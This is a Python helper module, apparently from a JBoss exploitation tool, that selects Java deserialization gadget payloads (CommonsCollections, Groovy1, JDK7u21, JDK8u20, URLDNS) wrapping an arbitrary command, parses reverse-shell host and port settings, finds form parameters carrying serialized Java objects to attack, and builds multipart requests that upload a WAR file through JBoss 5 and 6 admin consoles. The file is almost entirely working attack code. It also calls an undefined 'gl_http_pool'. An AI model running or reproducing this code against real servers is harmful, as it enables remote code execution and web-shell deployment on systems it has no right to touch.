import time
from time import sleep
from typing import Optional

from src.core.config import Config
from src.payloads.generate.commons_collections31_payload import generate_commons_collections31_payload
from src.payloads.generate.commons_collections40_payload import generate_commons_collections40_payload
from src.payloads.generate.groovy1_payload import generate_groovy1_payload
from src.payloads.generate.jdk7u21_payload import generate_jdk7u21_payload
from src.payloads.generate.jdk8u20_payload import generate_jdk8u20_payload
from src.payloads.generate.urldns_payload import generate_urldns_payload
from src.utils.misc import get_random_user_agent


def get_host_port_reverse_params(cfg: Config) -> tuple[Optional[str], Optional[str]]:
    if cfg.reverse_host:
        parts = cfg.reverse_host.split(":", 1)
        if len(parts) == 2:
            return parts[0], parts[1]
    return None, None


def get_successfully(url: str, path: str) -> int:
    """
    Делает GET-запрос к URL+path, при 404 повторяет через 7 секунд, возвращает HTTP-статус.
    """
    time.sleep(5)
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "User-Agent": get_random_user_agent(),
    }
    response = gl_http_pool.request("GET", url + path, redirect=False, headers=headers)
    status = response.status
    if status == 404:
        sleep(7)
        response = gl_http_pool.request("GET", url + path, redirect=False, headers=headers)
        status = response.status
    return status


def get_payload_gadget(gadget_type: str, cmd: str) -> bytes:
    """
    Returns serialized payload bytes for the specified gadget type.
    """
    return {
        "commons-collections3.1": generate_commons_collections31_payload(cmd),
        "commons-collections4.0": generate_commons_collections40_payload(cmd),
        "groovy1": generate_groovy1_payload(cmd),
        "jdk7u21": generate_jdk7u21_payload(cmd),
        "jdk8u20": generate_jdk8u20_payload(cmd),
        "dns": generate_urldns_payload(cmd),
    }.get(gadget_type, generate_commons_collections31_payload(cmd))


def get_list_params_with_serialized_objs(page: str) -> list[str]:
    """
    Extracts names/ids of form parameters containing serialized Java objects (GZIP/Base64 or Java serialization).
    """
    content = page.replace("\\n", "\n")
    params: list[str] = []
    for line in content.split("\n"):
        tokens = line.strip().split()
        for idx, token in enumerate(tokens):
            if 'value="H4sI' in token or 'value="rO0' in token:
                prev = tokens[idx - 1]
                if prev.startswith(('name="', 'id="')):
                    name = prev.split('"')[1]
                    if name not in params:
                        params.append(name)
    return params


def get_boundary_admin_console(jboss_version: int, state: str, payload: str) -> str:
    """
    Формирует тело multipart/form-data для загрузки WAR-файла в админ-консоль JBoss (версии 5 или 6).
    """
    boundary = "-----------------------------551367293438156646377323759\r\n"
    if jboss_version == 6:
        data = boundary
        data += "Content-Disposition: form-data; name=\"createContentForm\"\r\n\r\n"
        data += "createContentForm\r\n" + boundary
        data += "Content-Disposition: form-data; name=\"createContentForm:file\"; filename=\"jexws4.war\"\r\n"
        data += "Content-Type: application/octet-stream\r\n\r\n"
        data += payload + "\r\n" + boundary
        data += "Content-Disposition: form-data; name=\"createContentForm:rhq_prop-0_328868266\"\r\n\r\n"
        data += "false\r\n" + boundary
        data += "Content-Disposition: form-data; name=\"createContentForm:rhq_prop-0_-1257012452\"\r\n\r\n"
        data += "false\r\n" + boundary
        data += "Content-Disposition: form-data; name=\"createContentForm:addButton\"\r\n\r\n"
        data += "Continue\r\n" + boundary
        data += "Content-Disposition: form-data; name=\"javax.faces.ViewState\"\r\n\r\n"
        data += state + "\r\n"
        data += boundary[:-2] + "--\r\n"
        return data
    elif jboss_version == 5:
        data = boundary
        data += "Content-Disposition: form-data; name=\"createContentForm\"\r\n\r\n"
        data += "createContentForm\r\n" + boundary
        data += "Content-Disposition: form-data; name=\"createContentForm:file\"; filename=\"jexws4.war\"\r\n"
        data += "Content-Type: application/octet-stream\r\n\r\n"
        data += payload + "\r\n" + boundary
        data += "Content-Disposition: form-data; name=\"createContentForm:rhq_prop-1995377939_328868266\"\r\n\r\n"
        data += "false\r\n" + boundary
        data += "Content-Disposition: form-data; name=\"createContentForm:addButton\"\r\n\r\n"
        data += "Continue\r\n" + boundary
        data += "Content-Disposition: form-data; name=\"javax.faces.ViewState\"\r\n\r\n"
        data += state + "\r\n"
        data += boundary[:-2] + "--\r\n"
        return data
    else:
        raise ValueError(f"Unsupported JBoss version: {jboss_version}")
